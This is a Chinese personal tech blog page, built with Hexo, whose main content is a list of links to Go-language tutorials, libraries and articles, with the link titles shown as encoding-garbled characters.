<p><a href="https://www.bilibili.com/video/av57667564/" target="_blank" rel="noopener">Golang æ–°æ‰‹æ•™ç¨‹è§†é¢‘</a></p>
<p><a href="https://learnku.com/golang/t/31515" target="_blank" rel="noopener">golang å¯¹æ¥æ”¯ä»˜å®æ”¯ä»˜</a></p>
<p><a href="https://learnku.com/articles/31408" target="_blank" rel="noopener">Go è¯­è¨€å…¥é—¨</a></p>
<p><a href="https://github.com/tianye/sensitive_words" target="_blank" rel="noopener">æ•æ„Ÿè¯åŒ¹é…</a></p>
<p><a href="https://learnku.com/golang/t/24598" target="_blank" rel="noopener">ä½¿ç”¨ go çš„ gin å’Œ gorm æ¡†æ¶æ¥æ„å»º RESTful API å¾®æœåŠ¡</a></p>
<p><a href="https://learnku.com/articles/27591#faa0c7" target="_blank" rel="noopener">httprouter æºç åˆ†æ</a></p>
<p><a href="https://www.guaosi.com/2019/03/22/golang-maze-breadth-first-search/" target="_blank" rel="noopener">golangç®—æ³•ä¸æ•°æ®ç»“æ„ï¼šèµ°è¿·å®«-å¹¿åº¦ä¼˜å…ˆç®—æ³•</a></p>
<p><a href="https://learnku.com/articles/29791" target="_blank" rel="noopener">Swoole åç¨‹ä¸ Go åç¨‹çš„åŒºåˆ«</a></p>
<p><a href="https://learnku.com/articles/29375" target="_blank" rel="noopener">ç¨‹åºå‘˜å·¥ä½œä»¥åè¯¥å¦‚ä½•æå‡</a></p>
<p><a href="https://learnku.com/articles/29574" target="_blank" rel="noopener">Go å¼€å‘åŸºç¡€å…¥é—¨</a></p>
<p><a href="https://github.com/aceld/zinx" target="_blank" rel="noopener">å®Œæ•´è§†é¢‘ä»£ç åŠå­¦ä¹ èµ„æ–™-Zinx æ¡†æ¶-Golang è½»é‡çº§ TCP å¹¶å‘æœåŠ¡</a></p>
<p><a href="https://www.ganymedenil.com/2019/05/27/go-standard-library-by-parse-data-separated-by-commas.html" target="_blank" rel="noopener">goåŸºç¡€åº“ä¹‹è§£æä»¥é€—å·åˆ†éš”çš„æ•°æ®</a></p>
<p><a href="https://jiajunhuang.com/tutorial/golang/index.md" target="_blank" rel="noopener">Golang(Goè¯­è¨€)ç®€æ˜æ•™ç¨‹</a></p>
<p><a href="https://github.com/izghua/go-blog" target="_blank" rel="noopener">Golang+gin+vue+MySQL blog https:/www.iphpt.com</a></p>
<p><a href="https://www.njphper.com/posts/8b58ea6d.html" target="_blank" rel="noopener">Go Modules è¯¦è§£</a></p>
<p><a href="https://github.com/xusenlin/ForestBlog" target="_blank" rel="noopener">markdownåšå®¢</a></p>
<p><a href="https://github.com/rylio/ytdl" target="_blank" rel="noopener">YouTube download library and CLI written in Go</a></p>
<p><a href="https://github.com/dchaofei/phone-identifies-gender" target="_blank" rel="noopener">æ ¹æ®æ‰‹æœºå·è¯†æ€§åˆ«</a></p>
<p><a href="https://github.com/developer-learning/learning-golang" target="_blank" rel="noopener">Go å­¦ä¹ ä¹‹è·¯</a></p>
<p><a href="https://www.njphper.com/posts/b2d15c51.html" target="_blank" rel="noopener">Golang ä¸­çš„é¢å‘å¯¹è±¡ç»§æ‰¿</a></p>
<p><a href="https://github.com/broqiang/mdblog" target="_blank" rel="noopener">Laravel åšå®¢æ›¿æ¢æˆäº† Go å†™çš„åšå®¢</a></p>
<p><a href="https://github.com/360EntSecGroup-Skylar/excelize" target="_blank" rel="noopener">Go è¯­è¨€ Excel ç±»åº“ Excelize</a></p>
<p><a href="https://learnku.com/articles/26817" target="_blank" rel="noopener">Golang ä¸­çš„é¢å‘å¯¹è±¡</a></p>
<p><a href="https://learnku.com/articles/27591" target="_blank" rel="noopener">httprouter æºç åˆ†æ</a></p>
<p><a href="https://learnku.com/articles/26056" target="_blank" rel="noopener">Go for PHP Developers</a></p>
<p><a href="https://github.com/JeffreyBool/array" target="_blank" rel="noopener"> golang å®ç°çš„æ³›å‹æ•°ç»„</a></p>
<p><a href="https://58hualong.cn/blog/post/liyong-go-laravel-broadcast-shixian-laravel-de-jishi-tongxun" target="_blank" rel="noopener"> go-Laravel-broadcast å®ç° Laravel çš„å³æ—¶é€šè®¯</a></p>
<p><a href="https://learnku.com/articles/27808#topnav" target="_blank" rel="noopener">Golang æ–°æ‰‹å¯èƒ½ä¼šè¸©çš„ 50 ä¸ªå‘</a></p>
<p><a href="https://learnku.com/golang/wikis/27748" target="_blank" rel="noopener">ä½¿ç”¨ Go è¯­è¨€çš„å¼€æºé¡¹ç›®å’Œå…¬å¸</a></p>
<p><a href="https://learnku.com/articles/27561" target="_blank" rel="noopener">Go å¦‚ä½•å®ç° PHP çš„å¯†ç åŠ å¯†è§£å¯†</a></p>
<p><a href="https://github.com/dwg255/landlord" target="_blank" rel="noopener">golang å®ç°æ–—åœ°ä¸»æ£‹ç‰Œæ¸¸æˆ</a></p>
<p><a href="https://learnku.com/articles/26715" target="_blank" rel="noopener">Go ç¼–å†™ Web åº”ç”¨</a></p>
<p><a href="https://github.com/Away0x/gin_weibo" target="_blank" rel="noopener">æ¨¡ä»¿ Laravel çš„é¡¹ç›®ç»“æ„å’Œé£æ ¼</a></p>
<p><a href="https://broqiang.com/posts/http-client-base" target="_blank" rel="noopener">HTTP å®¢æˆ·ç«¯</a></p>
<p><a href="https://golang.google.cn/" target="_blank" rel="noopener">golangå›½å†…é•œåƒ</a></p>
<p><a href="https://www.alexedwards.net/blog/an-overview-of-go-tooling" target="_blank" rel="noopener">golangå·¥å…·</a></p>
<p><a href="https://learnku.com/articles/27691" target="_blank" rel="noopener">Golang ä½¿ç”¨ Map</a></p>
<p><a href="https://learnku.com/golang/t/27592" target="_blank" rel="noopener">å¥”è·‘çš„ Go</a></p>
<p><a href="https://learnku.com/articles/27561#topnav" target="_blank" rel="noopener">Go å¦‚ä½•å®ç° PHP çš„å¯†ç åŠ å¯†è§£å¯†</a></p>
<p><a href="https://www.zhanggaoyuan.com/article/8" target="_blank" rel="noopener">GOLANG è¶…å¤§æ–‡ä»¶è¯»å–çš„ä¸¤ä¸ªæ–¹æ¡ˆ</a></p>
<p><a href="https://learnku.com/articles/25470#topnav" target="_blank" rel="noopener">ã€Š åˆ»æ„å­¦ä¹  Golang - æ ‡å‡†åº“æºç åˆ†æ ã€‹</a></p>
<p><a href="https://github.com/EpochCloud/quick" target="_blank" rel="noopener">ä¸“ä¸ºå¾®æœåŠ¡æ¶æ„å®šåˆ¶çš„é«˜æ€§èƒ½ç½‘å…³</a></p>
<p><a href="https://github.com/Kirk-Wang/Hello-Gopher/" target="_blank" rel="noopener">goæ‰«ç›²</a></p>
<p><a href="http://www.yinwang.org/blog-cn/2014/04/18/golang" target="_blank" rel="noopener">å¯¹ Go è¯­è¨€çš„ç»¼åˆè¯„ä»·</a></p>
<p><a href="https://learnku.com/golang/t/26104" target="_blank" rel="noopener">miniblink+golang å¼€å‘ Windows gui åº”ç”¨</a></p>
<p><a href="https://huoding.com/2017/06/09/623" target="_blank" rel="noopener">é€šè¿‡å®ä¾‹å…¥é—¨Golang</a></p>
<p><a href="https://go-zh.org/doc/" target="_blank" rel="noopener">ä¸­æ–‡:æ–‡æ¡£é¦–é¡µ</a></p>
<p><a href="https://learnku.com/articles/27401" target="_blank" rel="noopener">Go Modules è¯¦è§£ä½¿ç”¨</a></p>
<p><a href="https://learnku.com/golang/t/28729#replies" target="_blank" rel="noopener">Golang çš„è½»é‡çº§ TCP å¹¶å‘æœåŠ¡å™¨æ¡†æ¶</a></p>
<p><a href="https://github.com/SuperPony/Golang" target="_blank" rel="noopener">Golang å…¥é—¨æŒ‡å—</a></p>
<p><a href="https://learnku.com/golang/t/24598" target="_blank" rel="noopener">ç”¨ go çš„ gin å’Œ gorm æ¡†æ¶æ¥æ„å»º RESTful API å¾®æœåŠ¡</a></p>
<p><a href="https://hoxis.github.io/resource-heima-go.html" target="_blank" rel="noopener">goè¯­è¨€è§†é¢‘æ•™ç¨‹</a></p>
<p><a href="https://learnku.com/golang/t/24715#replies" target="_blank" rel="noopener">Golang æ–°æ‰‹æ•™ç¨‹ï¼šå…¥é—¨é€ŸæˆæŒ‡å—</a></p>
<p><a href="https://github.com/SuperPony/Golang_Pkg" target="_blank" rel="noopener"> Go å®˜æ–¹åŒ…çš„å­¦ä¹ </a></p>
<p><a href="https://github.com/360EntSecGroup-Skylar/excelize" target="_blank" rel="noopener">Go è¯­è¨€ Excel æ–‡æ¡£excelize</a></p>
<p><a href="https://github.com/youngxhui/GinHello" target="_blank" rel="noopener">Gin å­¦ä¹ ç¤ºä¾‹ä»£ç </a></p>
<p><a href="https://goproxy.io/zh/" target="_blank" rel="noopener">golangä»£ç†</a></p>
<p><a href="https://github.com/jiujuan/go-collection" target="_blank" rel="noopener">goé¡¹ç›®æ”¶é›†</a></p>
<p><a href="https://www.bookstack.cn/read/The-Golang-Standard-Library-by-Example/summary.md" target="_blank" rel="noopener">Goè¯­è¨€æ ‡å‡†åº“</a></p>
<p><a href="https://github.com/dingdayu/phonedata" target="_blank" rel="noopener">æ‰‹æœºå½’å±åœ°æŸ¥è¯¢åŒ…</a></p>
<p><a href="https://learnku.com/articles/33318#reply106334" target="_blank" rel="noopener">go beegoå­¦ä¹ </a></p>
<p><a href="http://blog.rickiyang.cn/posts/42334b44.html" target="_blank" rel="noopener">GoåŸºç¡€è¯­æ³•å­¦ä¹ (1)</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/21/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/">23</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><a class="extend next" rel="next" href="/page/23/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">è‹ç”Ÿä¸æƒ‘</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">250</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/sushengbuhuo" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mysusheng@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://plus.google.com/mysusheng" target="_blank" title="Google">
                      
                        <i class="fa fa-fw fa-google"></i>Google</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://v2ex.com/" title="v2ex" target="_blank">v2ex</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.fanhaobai.com/" title="fanhaobai" target="_blank">fanhaobai</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="yuanxuxu" target="_blank">yuanxuxu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.snail-c.cn/article" title="snail-c" target="_blank">snail-c</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://showcj.com/archives" title="showcj" target="_blank">showcj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://vultr.aicnm.com/%E6%9C%80%E6%96%B0Vultr%E6%B3%A8%E5%86%8C%E5%8F%8AVPS%E8%B4%AD%E4%B9%B0%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B/" title="vultr" target="_blank">vultr</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lucissfer.com/" title="lucissfer" target="_blank">lucissfer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/fdipzone/article/details/79352685" title="å‚²é›ªæ˜Ÿæ«" target="_blank">å‚²é›ªæ˜Ÿæ«</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yoby123.cn/index.php/category/default/" title="å°ç™½çš„åˆ†äº«" target="_blank">å°ç™½çš„åˆ†äº«</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/p/5819995.html" title="PHPæ”»åŸç‹®" target="_blank">PHPæ”»åŸç‹®</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.jiaojie.site/" title="php" target="_blank">php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sphard.com/archives/" title="sphard" target="_blank">sphard</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="LNMPæŠ€æœ¯æ ˆç¬”è®°" target="_blank">LNMPæŠ€æœ¯æ ˆç¬”è®°</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.coding10.com/" title="å­¦ä¹  Laravel" target="_blank">å­¦ä¹  Laravel</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://shuwoom.com/?page_id=929" title="åŒºå—é“¾å­¦ä¹ æŒ‡å—" target="_blank">åŒºå—é“¾å­¦ä¹ æŒ‡å—</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://greenlightt.github.io/archives/" title="greenlightt" target="_blank">greenlightt</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.0php.net/archives/" title="0php" target="_blank">0php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.fordba.com/category/mysql" title="mysql" target="_blank">mysql</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.itcodemonkey.com/" title="ç¨‹åºå‘˜" target="_blank">ç¨‹åºå‘˜</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yanshuo.me/r/v2ex" title="è¨€è¯´" target="_blank">è¨€è¯´</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.timiguo.com/archive.html" title="æç±³æœçš„åšå®¢" target="_blank">æç±³æœçš„åšå®¢</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://phpartisan.cn/news/112.html" title="phpartisan" target="_blank">phpartisan</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/" title="é£é¸¿å½±" target="_blank">é£é¸¿å½±</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.54php.cn/" title="54php" target="_blank">54php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lazyman.vip/" title="è¥é”€" target="_blank">è¥é”€</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.njphper.com/archives/" title="åšäººå‘¢æœ€é‡è¦çš„å°±æ˜¯å¼€å¿ƒ" target="_blank">åšäººå‘¢æœ€é‡è¦çš„å°±æ˜¯å¼€å¿ƒ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.h57.pw/" title="php åˆå¿ƒè€…" target="_blank">php åˆå¿ƒè€…</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">è‹ç”Ÿä¸æƒ‘</span>

  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



<div>
<span id="showDays"></span>

</div>

<span id="busuanzi_container_site_pv">
   æ€»è®¿é—®é‡:<span id="busuanzi_value_site_pv"></span>æ¬¡
</span>



  <span class="post-meta-divider">|</span>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">åšå®¢å…¨ç«™å…±640.8kå­—</span>
</div>
<script>
var birthDay = new Date("11/20/2018");
var now = new Date();
var duration = now.getTime() - birthDay.getTime();
var total= Math.floor(duration / (1000 * 60 * 60 * 24));
document.getElementById("showDays").innerHTML = "æœ¬ç«™å·²è¿è¡Œ "+total+" å¤©";
</script>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      äººæ¬¡
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      æ¬¡
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  











<script type="text/javascript">
    (function() {
        // åŒ¿åå‡½æ•°ï¼Œé˜²æ­¢æ±¡æŸ“å…¨å±€å˜é‡
        var utterances = document.createElement('script');
        utterances.type = 'text/javascript';
        utterances.async = true;
        utterances.setAttribute('issue-term','0')
        utterances.setAttribute('theme','')
        utterances.setAttribute('repo','sushengbuhuo/laravel_ioc_demo')
        utterances.crossorigin = 'anonymous';
        utterances.src = 'https://utteranc.es/client.js';
        // content æ˜¯è¦æ’å…¥è¯„è®ºçš„åœ°æ–¹
        document.getElementById('gitment-container').appendChild(utterances);
    })();
</script>


  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

  
<script>
  ((window.gitter = {}).chat = {}).options = {
    //roomæ›¿æ¢æˆè‡ªå·±çš„èŠå¤©å®¤åç§°å³å¯ï¼Œroomçš„åç§°è§„åˆ™æ˜¯ï¼šusername/roomname
    room: 'sushengbuhuo-chat/mychat'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

</body>
</html>
